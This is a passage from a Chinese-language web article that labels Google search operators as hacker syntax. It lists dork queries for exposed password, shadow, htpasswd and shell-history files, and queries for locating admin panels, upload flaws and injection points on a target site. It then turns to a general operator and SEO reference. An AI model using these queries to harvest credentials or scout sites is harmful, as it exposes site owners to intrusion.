lang="EN-US">inurl:</span>是黑客重要的搜寻方法，可搜到网址包括的关键词，例如填上<span lang="EN-US">allinurl:login password</span>作搜寻，便会很易找到有<span lang="EN-US">login</span>和<span lang="EN-US">password</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal"><span lang="EN-US">filetype:</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">filetype:</span>是黑客专用语法，例如想找<span lang="EN-US">mdb</span>的数据库档案，可用<span lang="EN-US">password filetype:mdb</span>作搜寻，便会找到密码文件，进阶用法可配合<span lang="EN-US">inurl:</span>使用，例如<span lang="EN-US">girl filetype:jpg site:com </span>便可搜到所有标题<span lang="EN-US">.com</span>网站，而档案为<span lang="EN-US">girl.jp</span>或网页内容有<span lang="EN-US">girl</span>字符串的。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal"><span lang="EN-US">Index of /admin</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">搜到的结果大多数是容野峇嵺<span lang="EN-US">@ index browsing</span>的网站，随便按下一个连结便看到网站的文件夹和档案分布。</p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +password.txt</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">有些站长会将密码储存成<span lang="EN-US">password.txt</span>档案，如配合<span lang="EN-US">index browsing</span>的弁遄<span lang="EN-US">A</span>将<span lang="EN-US">google</span>的关键字符串成<span lang="EN-US">&ldquo;Index of /&rdquo; +password.txt</span>作搜寻，便找到很多<span lang="EN-US">password.txt</span></p><p class="MsoNormal">&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<span lang="EN-US">-</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">以下还有更多输入搜寻法，有时间可自行玩玩！</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /admin&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /password&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /mail&rdquo;</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +passwd</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +password.txt</span></p><p class="MsoNormal">&ldquo;<span lang="EN-US">Index of /&rdquo; +.htaccess</span></p><p class="MsoNormal"><span lang="EN-US">index of ftp +.mdb allinurl:/cgi-bin/ +mailto</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">administrators.pwd.index</span></p><p class="MsoNormal"><span lang="EN-US">authors.pwd.index</span></p><p class="MsoNormal"><span lang="EN-US">service.pwd.index</span></p><p class="MsoNormal"><span lang="EN-US">filetype:config web</span></p><p class="MsoNormal"><span lang="EN-US">gobal.asax index</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: &ldquo;index of/admin&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: &ldquo;index of/root&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: sensitive filetype:doc</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: restricted filetype :mail</span></p><p class="MsoNormal"><span lang="EN-US">allintitle: restricted filetype:doc site:gov</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:passwd filetype:txt</span></p><p class="MsoNormal"><span lang="EN-US">inurl:admin filetype:db</span></p><p class="MsoNormal"><span lang="EN-US">inurl:iisadmin</span></p><p class="MsoNormal"><span lang="EN-US">inurl:&rdquo;auth_user_file.txt&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:&rdquo;wwwroot/*.&rdquo;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">top secret site:mil</span></p><p class="MsoNormal"><span lang="EN-US">confidential site:mil</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">allinurl: winnt/system32/ (get cmd.exe)</span></p><p class="MsoNormal"><span lang="EN-US">allinurl:/bash_history</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;Index of&rdquo; .sh_history</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;Index of&rdquo; .bash_history</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; passwd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; people.lst</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; pwd.db</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; etc/shadow</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; spwd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; master.passwd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; htpasswd</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; members OR accounts</span></p><p class="MsoNormal"><span lang="EN-US">intitle:&rdquo;index of&rdquo; user_carts OR user_cart</span></p><p class="MsoNormal"><span lang="EN-US">google</span>上的黑客语法</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">察看基本情况：</p><p class="MsoNormal"><span lang="EN-US">inurl:*.asp </span>返回一些基本信息</p><p class="MsoNormal"><span lang="EN-US">site:xx.com </span>返回所有与该有关的<span lang="EN-US">url</span></p><p class="MsoNormal"><span lang="EN-US">link:xx.com </span>返回所有与该站做了连接的站</p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:txt </span>查找<span lang="EN-US">TXT</span>文件其他的依次内推</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查找后台</p><p class="MsoNormal"><span lang="EN-US">site:xx.com intext:</span>管理</p><p class="MsoNormal"><span lang="EN-US">site:xx.com inurl:login</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com intitle:</span>后台</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查看服务器使用的程序</p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:asp</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:php</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:jsp</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com filetype:aspx</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">查看上传漏洞：</p><p class="MsoNormal"><span lang="EN-US">site:xx.com inurl:file</span></p><p class="MsoNormal"><span lang="EN-US">site:xx.com inurl:load</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">查找注射点<span lang="EN-US">GhostEye</span>觉的这些指令不管在精确查找资料还是对于做<span lang="EN-US">SEO</span>的朋友都是非常有用的</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;">以下是目前所有的<span lang="EN-US">Google</span>搜索命令语法，它不同于<span lang="EN-US">Google</span>的帮助文档，因为这里介绍了几个<span lang="EN-US">Google</span>不推荐使用的命令语法。大多数的<span lang="EN-US">Google</span>搜索命令语法有它特有的使用格式，希望大家能正确使用。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">allinanchor: anchor</span>是一处说明性的文字，它标注说明了这个链接可能跳转到其它的网页或跳转到当前网页的不同地方。当我们用<span lang="EN-US">allinanchor</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果必须是那些在<span lang="EN-US">anchor</span>文字里包含了我们所有查询关键词的网页。例<span lang="EN-US">[ allinanchor: best museums Sydney ] ,</span>提交这个查询，<span lang="EN-US">Google</span>仅仅会返回在网页<span lang="EN-US">anchor</span>说明文字里边包含了关键词<span lang="EN-US">&rdquo;best&rdquo; &ldquo;museums&rdquo; </span>和<span lang="EN-US">&rdquo;Sydney&rdquo;</span>的网面。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">allintext: </span>当我们用<span lang="EN-US">allintext</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。例［<span lang="EN-US">allintext: travel packing list</span>］<span lang="EN-US">,</span>提交这个查询，<span lang="EN-US">Google</span>仅仅会返回在一个网页包含了三个关键词<span lang="EN-US">&rdquo;travel&rdquo; &ldquo;packing&rdquo;</span>和<span lang="EN-US">&rdquo;list&rdquo;</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">allintitle: </span>当我们用<span lang="EN-US">allintitle</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。例［<span lang="EN-US">allintitle: detect plagiarism</span>］，提交这个查询，<span lang="EN-US">Google</span>仅会返回在网页标题里边包含了<span lang="EN-US">&rdquo;detect&rdquo;</span>和<span lang="EN-US">&rdquo;plagiarism&rdquo;</span>这两个关键词的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">allinurl: </span>当我们用<span lang="EN-US">allinurl</span>提交查询的时候，<span lang="EN-US">Google</span>会限制搜索结果仅是那些在<span lang="EN-US">URL</span>（网址）里边包含了我们所有查询关键词的网页。例［<span lang="EN-US">allinurl: google faq</span>］，提交这个查询，<span lang="EN-US">Google</span>仅会返回在<span lang="EN-US">URL</span>里边包含了关键词<span lang="EN-US">&rdquo;google&rdquo;</span>和<span lang="EN-US">&rdquo;faq&rdquo;</span>的网页，象<span lang="EN-US">www.google.com/help /faq.html</span>等的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">author: </span>当我们用<span lang="EN-US">author</span>进行查询的时候，<span lang="EN-US">Google</span>会限制返回结果仅仅是那些在<span lang="EN-US">Google</span>论坛里边，包含了特定作者的新闻文章。在这里，作者名可以是全名，也可以是一部分或邮件地址。例［<span lang="EN-US">children author:john author:doe</span>］或［<span lang="EN-US">children author:doe@someaddress.com</span>］返回结果将是作者<span lang="EN-US">John Doe </span>或是<span lang="EN-US"> doe@someaddress.com</span>写的，关于包含关键词<span lang="EN-US">children</span>的文章。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">bphonebook: </span>用<span lang="EN-US">bphonebook</span>进行查询的时候，返回结果将是那些商务电话资料。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">cache: </span>提交<span lang="EN-US">cache:url </span>，<span lang="EN-US">Google</span>会显示当前网页的快照信息，从而替换网页的当前信息。例［<span lang="EN-US">cache:www.eff.org</span>］，提交这个查询，<span lang="EN-US">Google</span>会返回所有抓取的关于<span lang="EN-US">www.eff.org</span>的网页快照信息。在显示的网页快照信息里边，<span lang="EN-US">Google</span>会高亮显示查询关键词。（在<span lang="EN-US">cache:</span>和<span lang="EN-US">URL</span>之间不能有空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">datarange: </span>当我们使用<span lang="EN-US">datarange</span>进行查询的时候，<span lang="EN-US">Google</span>会将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被<span lang="EN-US">google</span>收录的时间算的。例　<span lang="EN-US">&ldquo;Geri </span></p><p class="MsoNormal"><span lang="EN-US">Halliwell&rdquo; &ldquo;Spice Girls&rdquo; daterange:2450958-2450968</span>　。这里的时间日期格式是按天文学的儒略日。（这个搜索语法<span lang="EN-US">Google</span>并不推荐使用，因为它会返回一些莫名其妙的东西）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">define: </span>当我们用<span lang="EN-US">define</span>进行查询的时候，<span lang="EN-US">Google</span>会返回包含查询关键词定义的网面。例［<span lang="EN-US">define: blog</span>］，这个查询将会返回<span lang="EN-US">Blog</span>的定义。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">ext: </span>这是一个没有证实的语法，可以用于<span lang="EN-US">filetype:</span>查找扩散名为<span lang="EN-US">ext</span>的文件。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">filetype: </span>当我们在查询里边包含<span lang="EN-US">filetype:</span>扩展名的时候，<span lang="EN-US">Google</span>会限制查询结果仅返回特定文件类型的网页。例［资产评估　<span lang="EN-US"> filetype:pdf</span>］，这个查询将会返回所有文件类型为<span lang="EN-US">pdf</span>的资产评估信息。其它可用的特定文件类型格式查询还有<span lang="EN-US">doc ,txt,ppt,xls.rtf,swf,ps</span>等。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">group: </span>当我们用<span lang="EN-US">group</span>查询的时候，<span lang="EN-US">Google</span>会限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。例［<span lang="EN-US">sleep group:misc.kids.moderated</span>］，提交这个查询，<span lang="EN-US">Google</span>仅会返回在用户组<span lang="EN-US">misc.kids.moderated</span>里边包含了查询关键字<span lang="EN-US">&rdquo;sleep&rdquo;</span>的文章。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">id: </span>又是一个没有证实的语法，效果很一般。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">inanchor: </span>当我们用<span lang="EN-US">inanchor</span>提交查询的时候，<span lang="EN-US">Google</span>会限制结果是那些在网页<span lang="EN-US">anchor</span>链接里边包含了查询关键词的网页。例［<span lang="EN-US">restaurants inanchor:gourmet</span>］，提交这个查询，<span lang="EN-US">Google</span>会查询那些在<span lang="EN-US">anchor</span>信息里包含了关键词<span lang="EN-US">&rdquo;restaurants&rdquo;</span>和关键词<span lang="EN-US">&rdquo;gourmet&rdquo;</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">info: </span>提交<span lang="EN-US">info:url</span>，将会显示需要查询网站的一些信息。例［<span lang="EN-US">info:gothotel.com</span>］，提交这个查询，将会返回网站<span lang="EN-US">gothotel.com</span>的所有信息。</p><p class="MsoNormal">　</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">insubject: </span>当我们用<span lang="EN-US">insubject</span>进行查询的时候，<span lang="EN-US">Google</span>会限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。［<span lang="EN-US">insubject:&rdquo;falling asleep&rdquo;</span>］，提交这个查询，<span lang="EN-US">Google</span>会返回在文章主题里边包含了<span lang="EN-US">&rdquo;falling asleep&rdquo;</span>的文章。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">intext: </span>当我们用<span lang="EN-US">intext</span>进行查询的时候，<span lang="EN-US">Google</span>会返回那些在文本正文里边包含了我们查询关键词的网页。［<span lang="EN-US">Hamish Reid intext:pandemonia</span>］，提交这个查询的时候，<span lang="EN-US">Google</span>会返回在文本正文包含查询关键字<span lang="EN-US">pandemonia</span>，在其它任何地方包含关键词<span lang="EN-US">&rdquo;Hamish&rdquo;</span>和<span lang="EN-US">&rdquo;Reid&rdquo;</span>的网页。（<span lang="EN-US">intext:</span>后面直接跟查询关键字，不能有空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">intitle: </span>当我们用<span lang="EN-US">intitle</span>进行查询的时候，<span lang="EN-US">Google</span>会返回那些在网页标题里边包含了我们查询关键词的网页。例［<span lang="EN-US">flu shot intitle:help</span>］，提交这个查询，<span lang="EN-US">Google</span>会返回在网页标题包含了查询关键字<span lang="EN-US">&rdquo;help&rdquo;</span>，而在其它任何地文包含了查询关键字<span lang="EN-US">&rdquo;flu&rdquo; </span>和<span lang="EN-US">&rdquo;shot&rdquo;</span>的网页。（<span lang="EN-US">intitle:</span>后面也不能有空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">inurl: </span>当我们用<span lang="EN-US">inurl</span>进行查询的时候，<span lang="EN-US">Google</span>会返回那些在<span lang="EN-US">URL</span>（网址）里边包含了我们查询关键词的网页。例［<span lang="EN-US">inurl:print site:www.ssoooo.com</span>］，提交这个查询，<span lang="EN-US">Google</span>会查找<span lang="EN-US">www.ssoooo.com</span>这个网站下面网址里边包含了查询关键词<span lang="EN-US">&rdquo;print&rdquo;</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">link: </span>当我们使用<span lang="EN-US">link:URL</span>提交查询的时候，<span lang="EN-US">Google</span>会返回跟此<span lang="EN-US">URL</span>做了链接的网站。例［<span lang="EN-US">link:www.ssoooo.com</span>］，提交这个查询，我们将得到所有跟<span lang="EN-US">www.ssooo.com</span>这个网站做了链接的网站。（<span lang="EN-US">link</span>是个单独的语法，只能单独使用，且后面不能跟查询关键词，跟能跟<span lang="EN-US"> URL</span>）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">location: </span>当我们提交<span lang="EN-US">location</span>进行<span lang="EN-US">Google</span>新闻查询的时候，<span lang="EN-US">Google</span>仅会返回你当前指定区的跟查询关键词相关的网页。例<span lang="EN-US">[ queen location:canada ]</span>，提交这个查询，<span lang="EN-US">Google</span>会返回加拿大的跟查询关键词<span lang="EN-US">&rdquo;queen&rdquo;</span>相匹配的网站。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">movie: </span>当我们用<span lang="EN-US">movie</span>提交查询的时候，<span lang="EN-US">Google</span>会返回跟查询关键词相关的电影信息。<span lang="EN-US">(</span>当前只支持英文<span lang="EN-US">Google)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">phonebook: </span>当我们用<span lang="EN-US">phonebook</span>进行查询的时候，<span lang="EN-US">Google</span>会返回美国当地跟查询关键词相关的电话信息。（使用<span lang="EN-US">phonebook</span>的时候需要指定详细的州名和地点名）例，［<span lang="EN-US">phonebook:smith ca</span>］</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">related: </span>用<span lang="EN-US">related</span>提交查询，<span lang="EN-US">Google</span>会返回跟我们要查询的网站结构内容相似的一些其它网站。例<span lang="EN-US">[ related:www.consumerreports.org ]</span>，提交这个查询，<span lang="EN-US">Google</span>会返回所有跟网站<span lang="EN-US">www.consumerreports.org</span>结构内容相似的网站。我们也可以通过点击搜索结果后面的相似网页，来查询跟当前网页类似的网页。（<span lang="EN-US">related:</span>后面不能跟空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">rphonebook: </span>这个查询用来搜索美国当地跟查询关键词相关的住宅电话信息。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">safesearch: </span>用<span lang="EN-US">safesearch</span>提交查询的时候，<span lang="EN-US">Google</span>会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。例，［<span lang="EN-US">safesearch:breasts</span>］。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">site: </span>当我们用<span lang="EN-US">site</span>提交查询的时候，<span lang="EN-US">Google</span>会限制查询仅在某个网站，或是某个域下面进行。例［<span lang="EN-US">admissions site:www.lse.ac.uk</span>］，提交这个查询仅仅会搜索网站<span lang="EN-US">www.lse.ac.uk</span>下面关于<span lang="EN-US">admissions</span>的信息。我们还可以限制搜索仅在域下面进行，例［<span lang="EN-US">javascript site:edu.cn</span>］，提交这个查询，仅仅在教育网查询关于<span lang="EN-US">javascript</span>的信息。（<span lang="EN-US">site:</span>后面不能跟空格，且<span lang="EN-US">site</span>命令可以配合其它命令进行）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">source: </span>当用<span lang="EN-US">source</span>提交查询的时候，<span lang="EN-US">Google</span>新闻会限制我们的查询仅是那些我们指定了特定<span lang="EN-US">ID</span>或新闻源的网址。例［<span lang="EN-US">election source:new_york_times</span>］，提交这个查询，<span lang="EN-US">Google</span>将会显示纽约时报包含了查询关键词<span lang="EN-US">&rdquo;election&rdquo;</span>的相关文章。（我们也可以通过<span lang="EN-US">Google news</span>高级搜索完成查询）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">stocks: </span>当我们用<span lang="EN-US">stocks</span>提交查询的时候，<span lang="EN-US">Google</span>会返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">store: </span>当我们用<span lang="EN-US">store</span>提交查询的时候，<span lang="EN-US">Google Froogle</span>仅会显示我们指定了<span lang="EN-US">store ID</span>的结果。例［<span lang="EN-US">polo shirt store:llbean</span>］，提交这个查询，仅会搜索商店<span lang="EN-US">L. L. Bean.</span>跟关键词<span lang="EN-US">&rdquo;polo&rdquo; &ldquo;shirt&rdquo;</span>相关的结果。（只支持英文<span lang="EN-US">Google</span>）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">tq: </span>如果想查某个地方的天气如何<span lang="EN-US">,</span>我们只要在<span lang="EN-US">Google</span>搜索框中输入<span lang="EN-US">&rdquo;</span>城市名称<span lang="EN-US"> Tq&rdquo;</span>就可以查询到这个城市的天状况<span lang="EN-US">.</span>例<span lang="EN-US">&rdquo;</span>北京<span lang="EN-US"> tq&rdquo;,</span>当然<span lang="EN-US">tq</span>也可以用汉字的天气代替。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">weather: </span>当我们用<span lang="EN-US">weather</span>提交查询的时候，如果我们指出一个<span lang="EN-US">Google</span>可以识别的地区或城市，<span lang="EN-US">Google</span>会返回该地区或城市当前的天气状况。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal" style="text-indent: 21.0pt; mso-char-indent-count: 2.0;"><span lang="EN-US">Google </span>提供高级搜索方法帮助<span lang="EN-US">SEOer</span>更方便的进行<span lang="EN-US">SEO</span>方面的研究和分析。今天简单的介绍几款常用的搜索方法。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; Site</span>的使用方式是：<span lang="EN-US">&ldquo;Site: + </span>域名<span lang="EN-US">&rdquo;</span>。比如说：<span lang="EN-US">site:seomao.com</span>。这种<span lang="EN-US">Google</span>搜索的作用是获得某个域名大概的被<span lang="EN-US">Google</span>收录的页面的数量，其中包括了二级域名的收录页面数量。用户也可以直接搜索某种后缀的<span lang="EN-US">Google</span>收录量。比如说<span lang="EN-US">: site:.gov</span>可以帮你了解政府部门网站有多少被<span lang="EN-US">Google</span>收录。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; InURL</span>或者<span lang="EN-US">AllInURL</span>的使用方法是：<span lang="EN-US">&ldquo;inurl</span>：关键词<span lang="EN-US">&rdquo; </span>或者<span lang="EN-US">&ldquo;allinurl</span>：关键词<span lang="EN-US">&rdquo;</span>。使用这种<span lang="EN-US">Google</span>搜索方法，结果中这个关键词必须出现在这个页面的<span lang="EN-US">URL</span>链接里面。如果你要搜索两个关键词同时出现的页面链接，应该用<span lang="EN-US">allinurl:</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:seo</span>，<span lang="EN-US">inurl:</span>资料<span lang="EN-US"> = allinurl:seo </span>资料</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; InTitle</span>或者<span lang="EN-US">AllInTitle</span>的使用方法是：<span lang="EN-US">&ldquo;inurl:</span>关键词<span lang="EN-US">&rdquo; </span>或者<span lang="EN-US">&ldquo;allinurl:</span>关键词<span lang="EN-US">&rdquo;</span>。 使用这种<span lang="EN-US">Google</span>搜索方法，搜索结果中这个关键词必须出现在这个页面的标题<span lang="EN-US">Title</span>里面。如果你要搜搜两个关键词同时出现的页面标题<span lang="EN-US">Title,</span>应该用<span lang="EN-US">allintitle:</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:seo</span>，<span lang="EN-US">inurl:</span>博客<span lang="EN-US"> = allintitle:seo </span>博客</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp; InText</span>的使用方法是：<span lang="EN-US">&ldquo;Intext:</span>关键词<span lang="EN-US">&rdquo;</span>。使用这种<span lang="EN-US">Google</span>搜索方法，搜索结果中这个关键词必须出现在这个页面正文的文字叙述中。比如说：<span lang="EN-US">intext:</span>站内<span lang="EN-US">SEO</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>星号在搜索中的含义是：可以代表任何东西。比如说你搜索：<span lang="EN-US">SEO * </span>工具。那么结果中既可能有<span 